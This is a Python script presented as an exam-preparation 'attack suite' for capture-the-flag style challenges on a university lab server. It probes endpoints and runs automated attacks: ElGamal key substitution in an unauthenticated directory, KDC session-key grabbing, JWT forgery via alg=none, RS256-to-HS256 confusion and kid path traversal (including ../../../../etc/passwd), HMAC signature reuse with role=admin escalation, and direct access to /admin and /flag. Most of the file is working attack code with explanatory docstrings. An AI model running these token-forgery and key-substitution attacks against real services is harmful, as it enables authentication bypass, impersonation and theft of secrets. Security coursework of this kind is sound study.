#!/usr/bin/env python3
"""
Key Distribution Attack Suite for CNS exam preparation
========================================================

USAGE:
    python key_dist_suite.py                    # use defaults
    python key_dist_suite.py config.json        # custom config

CONFIG (JSON):
    {
        "base_url":   "http://cns-test.idlab.uantwerpen.be:50011",
        "timeout":    10,
        "target_name":  "Bob",       # whom we want to impersonate
        "sender_name":  "Alice",     # who sends the secret
        "extra_headers": {}          # optional
    }

WHAT IT DOES:
    1. Probes the service to discover which endpoints exist.
    2. Based on the probe, picks the right set of attacks.
    3. Runs them in order of likelihood / cheapness.
    4. For each success, tries to extract the flag from the response.

ATTACKS IMPLEMENTED:

    A. Key substitution (primary)
       Register our own ElGamal public key under victim's name in the
       directory, trigger Alice's send, decrypt with our private key.

    B. Alternate-name substitution
       If primary name is protected, try variants ("bob", "Bob2", ...)
       or register under our own name and ask Alice to send there.

    C. KDC session-key grab
       Ask the KDC directly for a session key, hoping it doesn't
       authenticate the requester.

    D. JWT algorithm confusion
       Try alg=none, and RS256→HS256 confusion, and kid path traversal.

    E. HMAC signature reuse
       Reuse /challenge signature with modified payload (role=admin),
       or try alternate JSON canonicalizations.

    F. HTTP auth / trust bypass
       Look for any unprotected /admin, /vault, /flag endpoints after
       getting a guest token.
"""

import sys
import json
import hashlib
import base64
import hmac
import secrets
from typing import Optional

# ---- Dependencies with graceful fallback ----
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from Crypto.Util.number import inverse as _inv, long_to_bytes, bytes_to_long
    HAS_PYCRYPTODOME = True
except ImportError:
    HAS_PYCRYPTODOME = False


# ==========================================================================
# Default configuration
# ==========================================================================

DEFAULT_CONFIG = {
    "base_url":    "http://cns-test.idlab.uantwerpen.be:50011",
    "timeout":     10,
    "target_name": "Bob",
    "sender_name": "Alice",
    "extra_headers": {},
}


# ==========================================================================
# Core helpers
# ==========================================================================

def http_get(url, cfg, headers=None):
    """
    Wrapper for GET with timeout + logging.
    PITFALL: without timeout, requests hangs indefinitely on dead hosts.
    """
    h = dict(cfg.get("extra_headers") or {})
    if headers:
        h.update(headers)
    print(f"  [→] GET  {url}")
    try:
        r = requests.get(url, headers=h, timeout=cfg["timeout"])
        preview = r.text[:200].replace("\n", " ")
        print(f"  [←] {r.status_code} ({len(r.content)}B): {preview}")
        return r
    except requests.exceptions.RequestException as e:
        print(f"  [!] GET failed: {e}")
        return None


def http_post(url, payload, cfg, headers=None, as_json=True):
    """Wrapper for POST (JSON or raw)."""
    h = dict(cfg.get("extra_headers") or {})
    if headers:
        h.update(headers)
    print(f"  [→] POST {url}")
    print(f"       payload: {str(payload)[:200]}")
    try:
        if as_json:
            r = requests.post(url, json=payload, headers=h,
                              timeout=cfg["timeout"])
        else:
            r = requests.post(url, data=payload, headers=h,
                              timeout=cfg["timeout"])
        preview = r.text[:200].replace("\n", " ")
        print(f"  [←] {r.status_code} ({len(r.content)}B): {preview}")
        return r
    except requests.exceptions.RequestException as e:
        print(f"  [!] POST failed: {e}")
        return None


def try_json(r):
    """Attempt JSON parse; return None on failure."""
    if r is None:
        return None
    try:
        return r.json()
    except Exception:
        return None


def long_to_bytes_safe(n):
    if n == 0:
        return b"\x00"
    if HAS_PYCRYPTODOME:
        return long_to_bytes(int(n))
    return int(n).to_bytes((int(n).bit_length() + 7) // 8, "big")


def elgamal_decrypt(c1, c2, x, p):
    """
    Standard ElGamal decryption.

    MATH:
        c1 = g^k mod p, c2 = m * y^k mod p.
        s = c1^x = g^(kx) = y^k.
        m = c2 * s^{-1} mod p.
    """
    s = pow(c1, x, p)
    if HAS_PYCRYPTODOME:
        s_inv = int(_inv(s, p))
    else:
        s_inv = pow(s, -1, p)
    return (c2 * s_inv) % p


def b64url_encode(b):
    """Base64url without padding (for JWT)."""
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def b64url_decode(s):
    """Base64url decode with padding added back."""
    s = s.strip().rstrip("=")
    pad = "=" * (-len(s) % 4)
    try:
        return base64.urlsafe_b64decode(s + pad)
    except Exception:
        return None


def is_flag_like(text):
    """Heuristic: is this text a flag?"""
    if not isinstance(text, str):
        return False
    t = text.lower()
    return any(p in t for p in ("flag{", "ctf{", "cns{", "htb{", "picoctf{"))


def report_flag(source, value):
    """Unified flag report."""
    print(f"\n{'='*60}")
    print(f"[+] FLAG FOUND via {source}")
    print(f"{'='*60}")
    if isinstance(value, bytes):
        try:
            value = value.decode("utf-8")
        except UnicodeDecodeError:
            pass
    print(f"    {value}")


def find_flag_in_response(data, source_name):
    """
    Search a JSON response (dict / list / string) for anything flag-like.
    Returns the flag string or None.
    """
    def _walk(obj, path=""):
        if isinstance(obj, str):
            if is_flag_like(obj):
                return obj
        elif isinstance(obj, dict):
            for k, v in obj.items():
                result = _walk(v, f"{path}.{k}" if path else k)
                if result:
                    return result
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                result = _walk(v, f"{path}[{i}]")
                if result:
                    return result
        return None

    flag = _walk(data)
    if flag:
        report_flag(source_name, flag)
        return flag
    return None


# ==========================================================================
# Phase 0: Probe the service
# ==========================================================================

def probe_service(cfg):
    """
    Hit common endpoints to discover the service structure.

    WHY:
        Different challenges use different endpoint names. Instead of
        hard-coding, we ask the server what exists.

    PITFALL:
        - Some servers log 404s. Don't hammer with too many paths.
        - A 500 status often means the endpoint exists but input is wrong.
        - We accept anything < 500 as "exists".
    """
    base = cfg["base_url"]
    endpoints = [
        "/", "/params", "/directory", "/users", "/keys", "/pubkey",
        "/login", "/register", "/send", "/admin", "/vault", "/flag",
        "/challenge", "/request_session", "/kdc", "/session", "/key",
    ]
    found = {}
    for path in endpoints:
        r = http_get(f"{base}{path}", cfg)
        if r is not None and r.status_code < 500:
            found[path] = {
                "status": r.status_code,
                "preview": r.text[:300],
                "json": try_json(r),
            }
    return found


# ==========================================================================
# ATTACK A: Key substitution (primary attack for this challenge type)
# ==========================================================================

def attack_key_substitution(cfg):
    """
    Key Substitution Attack on ElGamal Public-Key Directory
    ========================================================

    CONDITION:
        HTTP service provides:
          - GET  /params        -> {"p": ..., "g": ...}
          - POST /directory     -> accepts {"name": ..., "y": ...}
          - GET  /send?to=NAME  -> returns ciphertext for NAME

    WHY IT WORKS (protocol flaw):
        The directory has no authentication. It lets anyone register or
        overwrite any public key. Alice queries /send?to=Bob, the server
        looks up "Bob"'s y (which is now OUR y), encrypts the secret to
        that y. Only we can decrypt (we have x).

    MATH:
        After registering our y = g^x mod p:
            c1 = g^k mod p       (k is fresh nonce)
            c2 = m * y^k mod p
        We recover:
            s = c1^x = g^(k*x) = y^k mod p
            m = c2 * s^{-1} mod p

    PITFALLS:
        1. Server may forbid overwriting existing keys (403/409).
           → See attack_alternate_names.
        2. Field names vary: 'y', 'public_key', 'key', 'pubkey'.
        3. /send response shape varies:
             {"c1": .., "c2": ..}   (dict)
             [c1, c2]                (list)
             "hex-string"           (raw)
           → We try all.
        4. If /send requires auth, we need a token (→ JWT or cookie flow).
        5. If /send returns encrypted_flag directly, try common patterns.
    """
    base = cfg["base_url"]
    victim = cfg["target_name"]
    print(f"\n{'='*60}")
    print(f"[→] ATTACK A: Key Substitution for '{victim}'")
    print(f"{'='*60}")

    # --- Step 1: get params ---
    r = http_get(f"{base}/params", cfg)
    if r is None:
        return None
    params = try_json(r)
    if not params or "p" not in params or "g" not in params:
        print("  [-] /params did not return {p, g}")
        return None
    p, g = int(params["p"]), int(params["g"])
    print(f"  [*] p = {p.bit_length()} bits, g = {g}")

    # --- Step 2: generate our keypair (use secrets, NOT random) ---
    x = secrets.randbelow(p - 2) + 2
    y = pow(g, x, p)
    print(f"  [*] our public y = {y}")
    print(f"  [*] our private x = {x}")

    # --- Step 3: try to register under victim's name ---
    registered = False
    for field in ("y", "public_key", "key", "pubkey"):
        payload = {"name": victim, field: str(y)}
        r = http_post(f"{base}/directory", payload, cfg)
        if r is not None and r.status_code in (200, 201, 204):
            print(f"  [+] Registration OK (field: {field})")
            registered = True
            break
        if r is not None:
            print(f"  [-] Rejected (status {r.status_code})")

    if not registered:
        print("  [-] All registration attempts rejected")
        print("      → Trying alternate names next")
        return None

    # --- Step 4: verify our key is actually in directory ---
    r = http_get(f"{base}/directory", cfg)
    directory = try_json(r)
    if isinstance(directory, dict):
        current = directory.get(victim)
        if current is not None and str(current) != str(y):
            print(f"  [!] Directory still shows a different key")
            print(f"      current: {str(current)[:80]}...")
            print(f"      ours:    {y}")
            print("      → Overwrite may have failed; trying /send anyway")
    elif isinstance(directory, list):
        for entry in directory:
            if isinstance(entry, dict) and entry.get("name") == victim:
                print(f"  [*] Directory entry for {victim}: "
                      f"{str(entry)[:200]}")

    # --- Step 5: trigger /send ---
    r = http_get(f"{base}/send?to={victim}", cfg)
    if r is None:
        return None

    # --- Step 6: parse response ---
    data = try_json(r)

    # Try to extract c1, c2 from many possible shapes
    c1, c2 = None, None
    if isinstance(data, dict):
        if "c1" in data and "c2" in data:
            c1, c2 = int(data["c1"]), int(data["c2"])
        elif "ciphertext" in data:
            ct = data["ciphertext"]
            if isinstance(ct, list) and len(ct) == 2:
                c1, c2 = int(ct[0]), int(ct[1])
            elif isinstance(ct, dict) and "c1" in ct and "c2" in ct:
                c1, c2 = int(ct["c1"]), int(ct["c2"])
        elif "encrypted_flag" in data:
            return try_decrypt_encrypted_flag(data, x, p, cfg)
        elif "secret" in data and isinstance(data["secret"], str):
            if is_flag_like(data["secret"]):
                return report_flag("plain secret field", data["secret"])
    elif isinstance(data, list) and len(data) == 2:
        c1, c2 = int(data[0]), int(data[1])

    # Check for flag in raw response as last resort
    flag = find_flag_in_response(data, "key substitution (response field)")
    if flag:
        return flag

    if c1 is None:
        print(f"  [-] Could not parse ciphertext: {str(data)[:300]}")
        return None

    # --- Step 7: decrypt ---
    m = elgamal_decrypt(c1, c2, x, p)
    print(f"\n  [+] Decrypted m (integer) = {m}")
    try:
        text = long_to_bytes_safe(m).decode("utf-8")
        print(f"  [+] Decrypted text: {text!r}")
        if is_flag_like(text):
            report_flag("Key substitution (ElGamal)", text)
        else:
            report_flag("Key substitution (plaintext)", text)
        return text
    except UnicodeDecodeError:
        raw = long_to_bytes_safe(m)
        print(f"  [*] Raw bytes: {raw!r}")
        report_flag("Key substitution (raw bytes)", raw)
        return raw


def try_decrypt_encrypted_flag(data, x, p, cfg):
    """
    Try common patterns to decrypt an encrypted_flag field using x.

    PATTERNS (try in order):
        P1: keystream = sha256(f"{x}:0") || sha256(f"{x}:1") || ...
        P2: keystream = long_to_bytes(x) repeated
        P3: AES-ECB with key = sha256(long_to_bytes(x))[:16]
        P4: single-block sha256(str(x)) XOR

    PITFALL:
        If none matches, print all candidates for manual inspection.
        Do NOT trust "looks like garbage" — flag may be non-ASCII.
    """
    enc = None
    if isinstance(data, dict):
        for k in ("encrypted_flag", "flag_ciphertext", "flag_enc",
                  "flag_ct", "secret"):
            if k in data:
                enc = data[k]
                break
    if enc is None:
        print("  [-] No encrypted flag field found")
        return None

    try:
        ct = bytes.fromhex(enc)
    except (ValueError, TypeError):
        print(f"  [*] encrypted_flag is not hex: {enc!r}")
        return enc if is_flag_like(str(enc)) else None

    candidates = []

    # P1: sha256(x:i) keystream
    ks = b""
    i = 0
    while len(ks) < len(ct):
        ks += hashlib.sha256(f"{x}:{i}".encode()).digest()
        i += 1
    candidates.append(("sha256(x:i)",
                       bytes(a ^ b for a, b in zip(ct, ks))))

    # P2: x-bytes keystream
    xb = long_to_bytes_safe(x)
    candidates.append(("x-bytes",
                       bytes(c ^ xb[i % len(xb)]
                             for i, c in enumerate(ct))))

    # P3: AES-ECB with key=sha256(x)[:16]
    try:
        from Crypto.Cipher import AES
        key = hashlib.sha256(long_to_bytes_safe(x)).digest()[:16]
        length = (len(ct) // 16) * 16
        candidates.append(("AES-ECB(sha256(x)[:16])",
                           AES.new(key, AES.MODE_ECB).decrypt(ct[:length])))
    except Exception:
        pass

    # P4: sha256(str(x)) single block
    ks = hashlib.sha256(str(x).encode()).digest()
    candidates.append(("sha256(str(x))",
                       bytes(a ^ b for a, b in zip(ct, ks))))

    for name, pt in candidates:
        try:
            text = pt.decode("utf-8")
        except UnicodeDecodeError:
            text = None
        if text and is_flag_like(text):
            report_flag(f"encrypted_flag via {name}", text)
            return text

    print("  [!] No standard flag pattern matched. Candidates:")
    for name, pt in candidates:
        print(f"      {name}: {pt.decode(errors='replace')!r}")
    return None


# ==========================================================================
# ATTACK B: Alternate-name substitution
# ==========================================================================

def attack_alternate_names(cfg):
    """
    Alternate-name Key Substitution
    ================================

    CONDITION:
        Primary victim name is protected (cannot overwrite).

    IDEA:
        The challenge says "Alice is happy to send her secret to anyone
        listed in it". So if we can register OUR key under ANY name,
        and Alice's secret is sent to that name, we win.

    STRATEGY:
        1. List directory to see existing names.
        2. Try alternate case: "bob", "BOB".
        3. Try suffix: "bob2", "bob_old", "bob (admin)".
        4. Try our own name: "Mallory", "eve123".
        5. Try "admin", "flag", "root".

    PITFALL:
        - /send may only accept specific "approved" names. In that case
          we need to figure out what names Alice will send to.
        - Some servers use ID instead of name. Inspect /directory shape.
    """
    base = cfg["base_url"]
    victim = cfg["target_name"]
    sender = cfg["sender_name"]

    print(f"\n{'='*60}")
    print(f"[→] ATTACK B: Alternate-name Substitution")
    print(f"{'='*60}")

    # List existing names
    r = http_get(f"{base}/directory", cfg)
    directory = try_json(r)
    existing = []
    if isinstance(directory, dict):
        existing = list(directory.keys())
    elif isinstance(directory, list):
        existing = [e.get("name") for e in directory
                    if isinstance(e, dict) and e.get("name")]
    print(f"  [*] Existing names: {existing}")

    # Get params + generate keypair
    r = http_get(f"{base}/params", cfg)
    params = try_json(r)
    if not params:
        return None
    p, g = int(params["p"]), int(params["g"])
    x = secrets.randbelow(p - 2) + 2
    y = pow(g, x, p)

    # Build candidate names
    candidates = [
        victim.lower(),
        victim.upper(),
        victim + "2",
        victim + "_old",
        victim + " (bank)",
        victim + "123",
        "Mallory", "mallory", "eve", "Eve",
        "admin", "Admin", "root", "test",
        sender.lower(),
    ] + [n for n in existing if n and n != victim]

    for name in candidates:
        if not name:
            continue
        print(f"\n  [*] Trying to register as: {name!r}")
        payload = {"name": name, "y": str(y)}
        r = http_post(f"{base}/directory", payload, cfg)
        if r is None or r.status_code not in (200, 201, 204):
            continue

        # Try to trigger /send
        r = http_get(f"{base}/send?to={name}", cfg)
        if r is None:
            continue
        data = try_json(r)

        # Parse ciphertext
        c1, c2 = None, None
        if isinstance(data, dict) and "c1" in data and "c2" in data:
            c1, c2 = int(data["c1"]), int(data["c2"])
        elif isinstance(data, list) and len(data) == 2:
            c1, c2 = int(data[0]), int(data[1])
        elif isinstance(data, dict) and "encrypted_flag" in data:
            return try_decrypt_encrypted_flag(data, x, p, cfg)

        if c1 is None:
            # Maybe flag is in the response already
            flag = find_flag_in_response(data, f"response for {name}")
            if flag:
                return flag
            continue

        # Decrypt
        m = elgamal_decrypt(c1, c2, x, p)
        try:
            text = long_to_bytes_safe(m).decode("utf-8")
            if is_flag_like(text):
                report_flag(f"alternate-name ({name})", text)
                return text
            print(f"    [*] Decrypted: {text!r}")
        except UnicodeDecodeError:
            print(f"    [*] Decrypted bytes: {long_to_bytes_safe(m)!r}")

    print("\n  [-] No alternate name succeeded")
    return None


# ==========================================================================
# ATTACK C: KDC session-key grab
# ==========================================================================

def attack_kdc(cfg):
    """
    KDC Session-Key Grab
    =====================

    CONDITION:
        Service acts as Key Distribution Center. Common endpoints:
          POST /request_session {"from": A, "to": B}
          POST /kdc {"client": A, "server": B}
          GET  /session_key?user=A&peer=B

    IDEA:
        If the KDC does not authenticate who is making the request,
        we can ask for the session key between Alice and Bob, or
        between us and Alice (then intercept).

    VARIANTS:
        1. Request directly: get session key for (Alice, Bob).
        2. Register ourselves, ask KDC for (ourselves, Alice),
           then impersonate "ourselves" in the chat.
        3. Use Alice's name as "from" (impersonation).

    PITFALL:
        - KDC often encrypts the session key with the long-term key of
          the requester. If we are not the requester, we can't decrypt.
        - BUT: if KDC accepts "from": "Alice" without verifying, we get
          the key meant for Alice — provided it's encrypted with a key
          we control, or not encrypted at all.
    """
    base = cfg["base_url"]
    sender = cfg["sender_name"]
    target = cfg["target_name"]

    print(f"\n{'='*60}")
    print(f"[→] ATTACK C: KDC Session-Key Grab")
    print(f"{'='*60}")

    endpoints = [
        ("POST", "/request_session",
         {"from": sender, "to": target}),
        ("POST", "/request_session",
         {"from": target, "to": sender}),  # symmetric
        ("POST", "/kdc",
         {"client": sender, "server": target}),
        ("POST", "/kdc",
         {"client": target, "server": sender}),
        ("POST", "/get_key",
         {"user": sender, "peer": target}),
        ("POST", "/session",
         {"a": sender, "b": target}),
        ("GET",  f"/session_key?user={sender}&peer={target}", None),
        ("GET",  f"/session_key?user={target}&peer={sender}", None),
        ("GET",  f"/key?user={sender}&peer={target}", None),
    ]

    for method, path, payload in endpoints:
        print(f"\n  [*] {method} {path}")
        if method == "GET":
            r = http_get(f"{base}{path}", cfg)
        else:
            r = http_post(f"{base}{path}", payload, cfg)

        if r is None or r.status_code not in (200, 201):
            continue

        data = try_json(r)
        flag = find_flag_in_response(data, f"KDC ({method} {path})")
        if flag:
            return flag

        # Maybe response contains an encrypted session key we can decrypt
        if isinstance(data, dict):
            for key_name in ("session_key", "key", "k"):
                if key_name in data:
                    key_hex = data[key_name]
                    print(f"    [*] Got session key field: {key_name}")
                    # Try to use it directly as flag
                    try:
                        if isinstance(key_hex, str) and is_flag_like(
                                bytes.fromhex(key_hex).decode(errors="ignore")):
                            report_flag("KDC session key", key_hex)
                            return key_hex
                    except Exception:
                        pass

    print("  [-] No KDC endpoint gave flag")
    return None


# ==========================================================================
# ATTACK D: JWT algorithm confusion
# ==========================================================================

def attack_jwt(cfg):
    """
    JWT Algorithm Confusion
    ========================

    CONDITION:
        Service uses JWT (three base64url parts, dot-separated).

    VARIANTS:
        (A) alg=none: replace header with {"alg":"none"}, empty signature.
        (B) RS256→HS256 confusion: sign with public key as HMAC secret.
        (C) kid path traversal: kid="../../../dev/null" makes verification
            succeed with empty/known key.

    MATH/PROTOCOL:
        JWT verification: HMAC(key, header.payload) == signature.
        If the server trusts the `alg` field in the header, an attacker
        can swap RS256 (asymmetric) for HS256 (symmetric) and use the
        PUBLIC key as HMAC secret. Server verifies with same public
        key bytes → success.

    PITFALLS:
        - Modern libs (PyJWT, jose) reject "none" by default.
        - Variant B requires access to the public key (often in /pubkey
          or .well-known/).
        - Variant C requires server to actually use `kid` as a path.
    """
    base = cfg["base_url"]
    print(f"\n{'='*60}")
    print(f"[→] ATTACK D: JWT Algorithm Confusion")
    print(f"{'='*60}")

    # --- Get guest token ---
    r = http_get(f"{base}/login", cfg)
    if r is None:
        return None
    data = try_json(r)
    token = None
    if isinstance(data, dict):
        token = data.get("token") or data.get("jwt") or data.get("access_token")
    elif isinstance(data, str):
        token = data
    if not token:
        print("  [-] /login did not return a token")
        return None
    print(f"  [*] Token (first 100): {token[:100]}...")

    parts = token.split(".")
    if len(parts) != 3:
        print(f"  [-] Not a JWT (parts: {len(parts)})")
        return None

    header_b = b64url_decode(parts[0])
    payload_b = b64url_decode(parts[1])
    print(f"  [*] Header:  {header_b}")
    print(f"  [*] Payload: {payload_b}")

    try:
        header = json.loads(header_b)
        payload = json.loads(payload_b)
    except Exception as e:
        print(f"  [-] Cannot parse JWT parts: {e}")
        return None

    # --- Variant A: alg=none ---
    print("\n  [*] Variant A: alg=none")
    for none_val in ("none", "None", "NONE", "nOnE"):
        for role_field in ("role", "is_admin", "admin", "user_type"):
            for role_val in ("admin", "administrator", True, 1):
                forged_payload = {**payload, role_field: role_val}
                h_b64 = b64url_encode(json.dumps(
                    {**header, "alg": none_val},
                    separators=(",", ":")).encode())
                p_b64 = b64url_encode(json.dumps(
                    forged_payload, separators=(",", ":")).encode())
                for suffix in ("", "."):
                    forged = f"{h_b64}.{p_b64}.{suffix}"
                    r = http_get(f"{base}/admin", cfg,
                                 headers={"Authorization": f"Bearer {forged}"})
                    if r is not None and r.status_code == 200:
                        flag = find_flag_in_response(try_json(r),
                                                     f"alg={none_val} role={role_val}")
                        if flag:
                            return flag
                        if is_flag_like(r.text):
                            report_flag(f"alg={none_val}", r.text)
                            return r.text

    # --- Variant B: RS256→HS256 ---
    print("\n  [*] Variant B: RS256→HS256 confusion")
    pubkey = None
    for pub_path in ("/pubkey", "/public_key", "/.well-known/jwks.json",
                     "/key"):
        r = http_get(f"{base}{pub_path}", cfg)
        if r is not None and r.status_code == 200:
            pubkey = r.text.strip()
            print(f"    [*] Found pubkey at {pub_path}: {pubkey[:80]}...")
            break
    if pubkey:
        # Try HS256 with pubkey bytes as secret
        for role_field in ("role", "is_admin", "admin"):
            for role_val in ("admin", True, 1):
                forged_payload = {**payload, role_field: role_val}
                h_b64 = b64url_encode(json.dumps(
                    {**header, "alg": "HS256"},
                    separators=(",", ":")).encode())
                p_b64 = b64url_encode(json.dumps(
                    forged_payload, separators=(",", ":")).encode())
                signing_input = f"{h_b64}.{p_b64}"
                sig = hmac.new(pubkey.encode(),
                               signing_input.encode(),
                               hashlib.sha256).digest()
                forged = f"{signing_input}.{b64url_encode(sig)}"
                r = http_get(f"{base}/admin", cfg,
                             headers={"Authorization": f"Bearer {forged}"})
                if r is not None and r.status_code == 200:
                    flag = find_flag_in_response(try_json(r),
                                                 f"RS256->HS256 role={role_val}")
                    if flag:
                        return flag
                    if is_flag_like(r.text):
                        report_flag(f"RS256->HS256 role={role_val}", r.text)
                        return r.text

    # --- Variant C: kid path traversal ---
    print("\n  [*] Variant C: kid path traversal")
    for kid in ("../../../dev/null", "/dev/null", "../../../../etc/passwd"):
        for role_field in ("role", "is_admin", "admin"):
            forged_payload = {**payload, role_field: "admin"}
            h_b64 = b64url_encode(json.dumps(
                {**header, "kid": kid}, separators=(",", ":")).encode())
            p_b64 = b64url_encode(json.dumps(
                forged_payload, separators=(",", ":")).encode())
            signing_input = f"{h_b64}.{p_b64}"
            # If kid points to /dev/null, key is empty -> HMAC with empty
            sig = hmac.new(b"", signing_input.encode(),
                           hashlib.sha256).digest()
            forged = f"{signing_input}.{b64url_encode(sig)}"
            r = http_get(f"{base}/admin", cfg,
                         headers={"Authorization": f"Bearer {forged}"})
            if r is not None and r.status_code == 200:
                flag = find_flag_in_response(try_json(r),
                                             f"kid={kid}")
                if flag:
                    return flag

    print("  [-] JWT attacks did not succeed")
    return None


# ==========================================================================
# ATTACK E: HMAC signature reuse
# ==========================================================================

def attack_hmac(cfg):
    """
    HMAC Signature Reuse / Canonicalization
    =========================================

    CONDITION:
        /challenge returns a signed JSON payload, /vault verifies signature.

    IDEA:
        If the signature check is over the JSON body only (not over
        headers/method/URI), then any payload with the same body passes.
        But bodies may be semantically equivalent in different ways:
          {"role":"guest","x":1}
          {"x":1,"role":"guest"}
        → same content, different string.
        If server serializes payload in a non-canonical way, our crafted
        payload might have same bytes but different meaning.

    OTHER VARIANTS:
        1. Server may accept signature with different Content-Type.
        2. Server may accept signature without header entirely.
        3. Server may accept "role":"admin" if HMAC check uses substring.

    PITFALL:
        - Usually only works if the challenge intentionally has a bug.
        - Cannot break real HMAC-SHA256 without the key.
    """
    base = cfg["base_url"]
    print(f"\n{'='*60}")
    print(f"[→] ATTACK E: HMAC Signature Reuse")
    print(f"{'='*60}")

    r = http_get(f"{base}/challenge", cfg)
    if r is None:
        return None
    data = try_json(r)
    print(f"  [*] /challenge: {str(data)[:300]}")

    if not isinstance(data, dict):
        return None

    # Find payload and signature
    payload = data.get("payload") or data.get("request") or data.get("message")
    signature = (data.get("signature") or data.get("sig")
                 or data.get("hmac") or data.get("X-Signature"))
    if payload is None or signature is None:
        print("  [-] No payload+signature pair in /challenge")
        return None

    # --- Variant 1: replay identical ---
    print("\n  [*] Variant 1: replay identical request")
    r = http_post(f"{base}/vault", payload, cfg,
                  headers={"X-Signature": signature}, as_json=True)
    if r is not None:
        flag = find_flag_in_response(try_json(r), "replay")
        if flag:
            return flag
        if is_flag_like(r.text):
            report_flag("replay", r.text)
            return r.text

    # --- Variant 2: change role to admin ---
    print("\n  [*] Variant 2: role=admin, keep signature")
    if isinstance(payload, dict):
        for role_field in ("role", "user_type", "is_admin", "admin"):
            for role_val in ("admin", "administrator", True, 1):
                forged = {**payload, role_field: role_val}
                r = http_post(f"{base}/vault", forged, cfg,
                              headers={"X-Signature": signature})
                if r is not None:
                    flag = find_flag_in_response(
                        try_json(r),
                        f"role={role_val} in {role_field}")
                    if flag:
                        return flag

    # --- Variant 3: alternate canonicalizations ---
    print("\n  [*] Variant 3: alternate JSON canonicalizations")
    if isinstance(payload, dict):
        for variant_name, serialized in [
            ("compact", json.dumps(payload, separators=(",", ":"))),
            ("spaced", json.dumps(payload)),
            ("sorted", json.dumps(payload, sort_keys=True,
                                  separators=(",", ":"))),
            ("indented", json.dumps(payload, indent=2)),
        ]:
            r = http_post(f"{base}/vault", serialized, cfg,
                          headers={"X-Signature": signature},
                          as_json=False)
            if r is not None:
                flag = find_flag_in_response(
                    try_json(r), f"canonicalization={variant_name}")
                if flag:
                    return flag

    print("  [-] HMAC attacks did not succeed")
    return None


# ==========================================================================
# ATTACK F: unprotected /admin, /vault, /flag
# ==========================================================================

def attack_unprotected(cfg):
    """
    Direct Access to Protected Endpoints
    =====================================

    CONDITION:
        Server misconfigured to not actually require auth on /admin,
        /vault, /flag, or similar.

    IDEA:
        Just GET the endpoint with no auth, see what comes back.

    PITFALL:
        Rarely works on exam challenges (they usually add basic auth).
        Worth 5 seconds to check.
    """
    base = cfg["base_url"]
    print(f"\n{'='*60}")
    print(f"[→] ATTACK F: Unprotected endpoints")
    print(f"{'='*60}")

    for path in ("/admin", "/vault", "/flag", "/secret",
                 "/admin/flag", "/api/admin", "/internal/flag"):
        r = http_get(f"{base}{path}", cfg)
        if r is None or r.status_code != 200:
            continue
        if is_flag_like(r.text):
            report_flag(f"unprotected {path}", r.text)
            return r.text
        data = try_json(r)
        flag = find_flag_in_response(data, f"unprotected {path}")
        if flag:
            return flag

    print("  [-] No unprotected endpoints")
    return None


# ==========================================================================
# Main dispatcher
# ==========================================================================

def main():
    if not HAS_REQUESTS:
        print("[!] Install 'requests': pip install requests")
        sys.exit(1)

    # Load config
    cfg = dict(DEFAULT_CONFIG)
    if len(sys.argv) > 1:
        with open(sys.argv[1]) as f:
            cfg.update(json.load(f))
        print(f"[*] Loaded config from {sys.argv[1]}")
    else:
        print(f"[*] Using default config")
    print(f"    base_url:  {cfg['base_url']}")
    print(f"    target:    {cfg['target_name']}")
    print(f"    sender:    {cfg['sender_name']}")

    # Phase 0: probe
    print("\n" + "=" * 60)
    print("PHASE 0: Service discovery")
    print("=" * 60)
    found = probe_service(cfg)
    if not found:
        print("\n[!] Service did not respond on any endpoint.")
        print("    Most likely cause: NOT connected to UA-VPN.")
        print(f"    Try:  curl -v --max-time 10 {cfg['base_url']}/params")
        print("    → Connect to UA-VPN, then re-run.")
        sys.exit(1)

    print(f"\n[*] Endpoints that responded: {sorted(found.keys())}")

    # Phase 1: choose attacks based on probe
    attacks = []
    has_directory = "/directory" in found
    has_send = "/send" in found
    has_params = "/params" in found
    has_login = "/login" in found
    has_challenge = "/challenge" in found
    has_kdc = any(p in found for p in
                  ("/request_session", "/kdc", "/session", "/key"))

    if has_directory and has_send and has_params:
        attacks.append(("A. Key substitution", attack_key_substitution))
    if has_directory and has_send:
        attacks.append(("B. Alternate names", attack_alternate_names))
    if has_kdc:
        attacks.append(("C. KDC", attack_kdc))
    if has_login:
        attacks.append(("D. JWT", attack_jwt))
    if has_challenge:
        attacks.append(("E. HMAC", attack_hmac))

    # Always try unprotected as last resort (cheap)
    attacks.append(("F. Unprotected endpoints", attack_unprotected))

    if not attacks:
        print("\n[!] Could not auto-detect attack type.")
        print("    Running everything (may take a while)...")
        attacks = [
            ("A. Key substitution", attack_key_substitution),
            ("B. Alternate names", attack_alternate_names),
            ("C. KDC", attack_kdc),
            ("D. JWT", attack_jwt),
            ("E. HMAC", attack_hmac),
            ("F. Unprotected endpoints", attack_unprotected),
        ]

    # Phase 2: run
    for name, fn in attacks:
        print(f"\n\n{'#'*60}")
        print(f"# {name}")
        print(f"{'#'*60}")
        try:
            result = fn(cfg)
            if result is not None:
                print(f"\n[✓] {name} SUCCEEDED — see above for flag")
                return
        except Exception as e:
            import traceback
            print(f"[!] {name} crashed: {e}")
            traceback.print_exc()

    # Phase 3: fallback
    print("\n\n" + "=" * 60)
    print("[-] ALL ATTACKS FAILED")
    print("=" * 60)
    print("""
    Suggestions (in order of likelihood):

      1. Re-read the challenge description
         - The title often hints at the attack ("Trust Issues",
           "Impersonator", "Phone Book 2")
         - Any parenthetical hint is important

      2. Re-run with the RIGHT victim name
         - If /directory shows "bob" not "Bob", update config:
           { "target_name": "bob" }
         - If /directory shows "Alice" is the sender, update too

      3. Inspect the raw probe output above
         - Are there unusual endpoints?
         - Does /directory have a "role" field?
         - Does /login give a cookie instead of a token?

      4. Try MANUAL HTTP
         curl -v {base}/params
         curl -v {base}/directory
         curl -v "{base}/send?to=Bob"

      5. Try raw TCP (if challenge uses netcat)
         nc cns-test.idlab.uantwerpen.be <port>
         (install netcat; use 'pwn' library in Python)

      6. If probing times out → connect to UA-VPN
    """.format(base=cfg["base_url"]))


if __name__ == "__main__":
    main()